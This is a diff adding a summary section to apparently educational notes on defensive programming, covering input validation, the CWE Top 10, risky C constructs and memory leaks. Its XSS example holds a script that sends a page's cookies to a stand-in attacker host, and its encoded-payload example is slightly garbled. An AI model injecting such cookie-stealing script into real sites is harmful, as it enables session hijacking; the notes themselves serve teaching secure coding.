@@ -67,3 +67,59 @@ manipulation, leading to flaws/bugs like the previous code. These bugs might be 
 Programs often allocate memory on the heap. Memory should be released when the tasks have been performed. Else, a memory leak can happen, that is: incorrect use of memory might steadily increase memory allocation, exhausting it.
 ## Handling interaction
 **Environment variables**: a collection of string values inherited by each process from its parent that can affect the way a running process behaves.
+
+--- 
+# Summary
+## Overview
+Software security involves writing **safe code** and correctly handling input/output to prevent vulnerabilities. While preventing vulnerabilities is ideal, it requires proactive measures in design, implementation, and maintenance.
+## Key Terminology
+1. **Prevention**: Techniques to specify and build secure software.
+2. **Detection**: Effective testing methods to find vulnerabilities.
+3. **Mitigation**: Building resilient architectures (e.g., defense in depth).
+## CWE Top 10
+A list of the most dangerous and common software vulnerabilities, highlighting key areas where developers should focus.
+## Defensive Programming
+### Principles
+- Software must continue to work safely, even under attack.
+- Detect erroneous conditions (e.g., attacks) and either:
+  - Fail gracefully.
+  - Operate securely.
+### Common Developer Mindset
+- Developers often prioritize functionality ("it works") over security ("it’s safe").
+- Defensive programming demands anticipation of failures and awareness of vulnerabilities.
+### Golden Rule
+**Do not assume anything**; handle all potential error states.
+## How to Implement Defensive Programming
+### 1. Handle Program Input
+- Always validate inputs for constraints and correctness (e.g., array size must be valid).
+#### Input Interpreting
+- Encoding mismatches can bypass validation (e.g., `hello%2Fscript%3Ealert(1)%3Cscript` decoding to `<script>alert(1)</script>`).
+#### Consequences of Failure
+- Vulnerabilities such as:
+  - **Code Injection**: Arbitrary code execution.
+  - **File Inclusion Attacks**: Inserting malicious files.
+  - **Cross-Site Scripting (XSS)**: Malicious scripts rendered on trusted pages.
+    - Example:
+      ```html
+      <script>
+      document.location='http://hacker.web.site/cookie.cgi?'+document.cookie
+      </script>
+      ```
+    - **Countermeasure**: Use whitelisting/blacklisting mechanisms (e.g., regular expressions).
+### 2. Writing Safe Code
+- Use strongly typed languages to ensure data consistency.
+- Avoid risky constructs (e.g., casting pointers in C):
+  ```c
+  int main() {
+      void (*func_ptr)() = (void (*)())&func_ptr;
+      func_ptr();
+      return 0;
+  }
+```
+#### Memory Management
+- Release memory after use to prevent **memory leaks**.
+- Improper memory handling can lead to exhaustion or exploitation.
+### Handling Interaction
+- **Environment Variables**:
+    - Inherited by processes and influence program behavior.
+    - Handle them securely to prevent unintended modifications.
